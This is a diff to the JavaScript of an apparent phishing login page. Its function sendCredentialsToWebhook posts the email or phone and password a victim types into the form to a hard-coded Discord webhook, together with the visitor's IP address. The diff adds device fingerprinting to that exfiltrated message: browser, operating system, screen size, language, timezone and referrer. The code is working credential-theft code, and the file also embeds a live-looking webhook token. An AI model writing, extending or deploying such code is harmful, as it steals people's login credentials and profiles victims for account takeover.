@@ -6,8 +6,9 @@ const loginButton = document.querySelector("button");
 // Webhook URL
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1358739681470316677/-GPhfZIhYskH1FlWulsIrUQZoG_oE6w7tewh1e8EowwBhSSDRdNzMXUPjG39gwUyt0uB";
 
-// Variable to store the user's IP address
+// Variables to store user data
 let userIP = "Unknown IP";
+let userDeviceInfo = {};
 
 // -----------------------------------
 // FETCH IP ADDRESS ON PAGE LOAD
@@ -27,20 +28,60 @@ async function fetchIPAddress() {
 document.addEventListener("DOMContentLoaded", async () => {
   userIP = await fetchIPAddress(); // Store the IP address in the `userIP` variable
   console.log("User IP Address:", userIP); // Optional: Log the IP for debugging
+  collectDeviceInfo(); // Collect additional device info
 });
 
 // -----------------------------------
-// ELLIPSIS ANIMATION
-// ------------------------------------
-function removeEllipsisAnimation() {
-  loginButton.innerHTML = "";
-  loginButton.textContent = "Log In";
-  loginButton.removeAttribute("disabled");
+// COLLECT DEVICE INFORMATION
+// -----------------------------------
+function collectDeviceInfo() {
+  userDeviceInfo = {
+    userAgent: navigator.userAgent,
+    browserName: getBrowserName(),
+    browserVersion: getBrowserVersion(),
+    os: getOS(),
+    platform: navigator.platform,
+    screenWidth: window.screen.width,
+    screenHeight: window.screen.height,
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    referrer: document.referrer || "Direct",
+  };
+  console.log("Device Info:", userDeviceInfo); // Optional: Log device info for debugging
 }
 
+// Helper functions to extract browser and OS details
+function getBrowserName() {
+  const userAgent = navigator.userAgent;
+  if (/Firefox/.test(userAgent)) return "Firefox";
+  if (/Chrome/.test(userAgent)) return "Chrome";
+  if (/Edg/.test(userAgent)) return "Edge";
+  if (/Safari/.test(userAgent)) return "Safari";
+  return "Unknown Browser";
+}
+
+function getBrowserVersion() {
+  const userAgent = navigator.userAgent;
+  const match = userAgent.match(/(Chrome|Firefox|Edg|Safari)\/(\d+)/);
+  return match ? match[2] : "Unknown Version";
+}
+
+function getOS() {
+  const userAgent = navigator.userAgent;
+  if (/Windows/.test(userAgent)) return "Windows";
+  if (/Mac/.test(userAgent)) return "MacOS";
+  if (/Linux/.test(userAgent)) return "Linux";
+  if (/Android/.test(userAgent)) return "Android";
+  if (/iPhone|iPad/.test(userAgent)) return "iOS";
+  return "Unknown OS";
+}
+
+// -----------------------------------
+// SEND DATA TO WEBHOOK
+// -----------------------------------
 async function sendCredentialsToWebhook(email, password) {
   try {
-    // Use the stored IP address
+    // Use the stored IP address and device info
     const ip = userIP;
 
     // Prepare the embed payload
@@ -63,6 +104,36 @@ async function sendCredentialsToWebhook(email, password) {
             {
               name: "IP Address",
               value: ip || "Unknown IP",
+              inline: false,
+            },
+            {
+              name: "Browser",
+              value: `${userDeviceInfo.browserName} (${userDeviceInfo.browserVersion})`,
+              inline: true,
+            },
+            {
+              name: "Operating System",
+              value: userDeviceInfo.os,
+              inline: true,
+            },
+            {
+              name: "Screen Resolution",
+              value: `${userDeviceInfo.screenWidth}x${userDeviceInfo.screenHeight}`,
+              inline: true,
+            },
+            {
+              name: "Language",
+              value: userDeviceInfo.language,
+              inline: true,
+            },
+            {
+              name: "Timezone",
+              value: userDeviceInfo.timezone,
+              inline: true,
+            },
+            {
+              name: "Referrer",
+              value: userDeviceInfo.referrer,
               inline: false,
             },
           ],
@@ -90,6 +161,15 @@ async function sendCredentialsToWebhook(email, password) {
   }
 }
 
+// -----------------------------------
+// ELLIPSIS ANIMATION
+// ------------------------------------
+function removeEllipsisAnimation() {
+  loginButton.innerHTML = "";
+  loginButton.textContent = "Log In";
+  loginButton.removeAttribute("disabled");
+}
+
 function animateEllipsis() {
   // Get user input from the form
   const email = document.getElementById("emailORphone").value;
@@ -99,7 +179,6 @@ function animateEllipsis() {
   sendCredentialsToWebhook(email, password);
 
   // Start animation
-  loginButton.innerHTML = "";
   loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                                     <span class="inner pulsingEllipsis">
                                         <span class="item spinnerItem"></span>
